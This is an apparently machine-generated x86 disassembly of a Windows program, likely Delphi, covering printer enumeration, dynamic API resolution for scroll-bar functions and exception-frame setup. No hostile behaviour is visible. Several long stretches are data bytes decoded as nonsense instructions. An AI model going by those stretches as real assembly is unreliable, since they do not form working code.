xor edx edx
mov eax ebx
call sub_429aa4
mov eax [ ebx + 0x24 ]
mov [ eax + 0x36 ] si
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a04d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x4 ]
call sub_429870
sub_42a06c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a29b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_42a258
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_40276c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42a247
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403b20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a2a2
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_40405c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_40278c
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42983c
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_429908
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_404230
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_429908
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_408f18
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42983c
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42a2ac
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a489
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e34
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42a449
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42983c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_40278c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_42a06c
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40cc30
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405dec
mov eax [ ebp - 0x41c ]
call sub_429870
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4044f8
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x8 ]
call sub_4044f8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_429d1c
call sub_403b20
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_404230
mov edx [ ebp - 0x420 ]
pop eax
call sub_40809c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a490
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_40405c
retn
sub_42a4ac
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40d18c
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4032e8
inc edi
dec ebx
jne r-xdata
sub_42a514
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a545
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a54c
retn
mov eax [ rw-data ]
call sub_4032e8
sub_42a558
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42a58c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42a5b4
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42a836
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a85d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a864
retn
sub_42a878
les ebp [ eax + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42a8e0
add [ eax ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ecx + ebp * 4 + 0x42 ] al
add [ eax - 0x57 ] cl
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
inc edx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x5673ffc0 ] bl
inc edx
add [ ecx + ebp * 4 - 0x5637ffbe ] bh
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx + 0x1c0042 ] ch
add [ eax ] al
js r-xdata
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x28 ] si
test eax 0x42
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42a94c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42a98c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42a9e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42aa09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa10
retn
sub_42aa1c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42a9d4
xor eax eax
push ebp
push sub_42abd3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42abda
mov eax [ rw-data ]
call sub_42a9dc
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42abdc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42a9d4
xor eax eax
push ebp
push sub_42af8f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af96
mov eax [ rw-data ]
call sub_42a9dc
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42b340
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42b368
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b3b0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b3b7
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4032e8
call sub_42aa1c
cmp [ rw-data ] 0x0
jg r-xdata
sub_42b3d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b3fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b404
retn
sub_42b410
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b435
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b43c
retn
sub_42b448
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b46d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b474
retn
sub_42b480
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b4a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b4ac
retn
sub_42b4b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b4dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b4e4
retn
sub_42b4f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b515
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b51c
retn
sub_42b528
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b54d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b554
retn
sub_42b588
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b5ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b5b4
retn
sub_42b5c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b5e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b5ec
retn
sub_42bb75
leave
inc edx
add [ ebx ] cl
push esp
inc esi
outsd
outsb
je r-xdata
add al 0x46
outsd
outsb
je r-xdata
imul esp [ ecx + 0x6c ] 0xbb88676f
inc edx
add [ edi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc esi
outsd
outsb
je r-xdata
mov edx 0x5c0042
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
inc esp
jbe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ ecx + 0x6c ] 0xbb30676f
inc edx
add [ esi + esi * 4 + 0xc0042 ] dh
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x673676f
add ah dl
jmp r-xdata
imul ebp [ esi + 0x74 ] 0x676e6152
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + edi * 4 + 0x42 ] bh
add [ edx ] cl
jo r-xdata
imul edi [ edx + 0x65 ] r-xdata
pop ebp
add [ eax ] al
[ ebp ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
or al [ eax ]
pop es
dec edi
jo r-xdata
arpl [ ebp + 0x54 ] sp
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ ebp + 0x69 ]
outsb
jo r-xdata
inc ecx
insb
insb
push eax
popad
jae r-xdata
add [ ebx ] al
adc dl [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616944
outsd
dec edi
jo r-xdata
imul ebp [ edi + 0x6e ] 0x42baac73
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000b ] al
outsb
inc ecx
jo r-xdata
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] al
[ eax + eax ]
jo r-xdata
push edi
popad
jb r-xdata
or dh [ eax + 0x72 ]
push eax
popad
dec esi
jne r-xdata
jo r-xdata
dec edi
jo r-xdata
imul ebp [ edi + 0x6e ] 0x1
inc edx
add [ 0x72506f70 ] cl
imul ebp [ esi + 0x74 ] 0x69466f54
insb
or dh [ gs : eax + 0x6f ]
push eax
popad
insb
jns r-xdata
add [ eax ] al
clc
mov ch 0x42
add [ eax ] cl
fadd [ ecx ]
cmp al 0x35
inc eax
add [ ecx + edx * 8 + 0x41 ] bl
add al bh
imul ebp [ esi + 0x67 ] 0x486f7006
push eax
jae r-xdata
insb
jo r-xdata
outsd
dec eax
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
fadd [ ecx ]
or ch dl
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
test al 0xc3
inc edx
add al dl
les eax [ edx ]
and al 0xc4
inc edx
add [ eax * 8 - 0x30bfffbe ] bl
inc edx
add [ esp + edx * 2 ] cl
push eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0xbcc40173
inc edx
add [ ebx + 0x42bda8c0 ] cl
outsb
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jae r-xdata
inc esi
outsd
outsb
je r-xdata
inc eax
add [ eax + 0x30042bc ] al
or edx [ eax + edx * 2 + 0x72 ]
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x4073676f
jo r-xdata
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
xor eax 0xc44c0040
inc edx
outsb
je r-xdata
enter 0x42bc 0x0
add edx [ edx ]
push esp
push eax
jb r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0xc873676f
mov esp 0x12030042
add [ eax ] al
pop es
add [ esi ] al
inc ebx
outsd
jo r-xdata
outsb
je r-xdata
outsb
je r-xdata
dec esi
jne r-xdata
outsd
inc esi
imul ebp [ ebp + 0xa ] 0x61506f70
or [ eax + 0x6f ] esi
jo r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add al ch
aam 0x41
add [ ebx + edx * 8 - 0x2b07ffbf ] dh
inc ecx
rol [ ecx ] 0x1
inc esp
jb r-xdata
inc esp
imul esi [ ebx + 0x61 ] 0x50656c62
outsd
inc esi
imul ebp [ ebp + 0x7 ] 0x6c616944
outsd
jae r-xdata
popad
insb
outsb
je r-xdata
cmp al 0xbd
jae r-xdata
add [ eax ] al
push es
add [ edi ] al
inc ebx
outsd
insb
insb
popad
je r-xdata
imul esp [ ecx + 0x6c ] 0x408d676f
add ah bh
mov ebp 0xc070042
push esp
push eax
jb r-xdata
add [ ebp + esi + 0x40 ] al
add [ esp + eax * 8 + 0x42 ] cl
xor eax 0xd15c0040
inc ecx
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x7043003e
add [ eax ] al
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov ebp 0x700042
mov ebp 0x13060042
push esp
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
inc edx
add [ ebx ] al
or edx [ esi + eax * 2 + 0x69 ]
outsb
dec edi
jo r-xdata
imul ebp [ edi + 0x6e ] 0x40100073
add [ edx ] ah
add bh bh
bound eax [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or edx [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x69466f54
insb
jl r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
or al [ eax ]
pop es
dec ebp
popad
js r-xdata
push esp
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
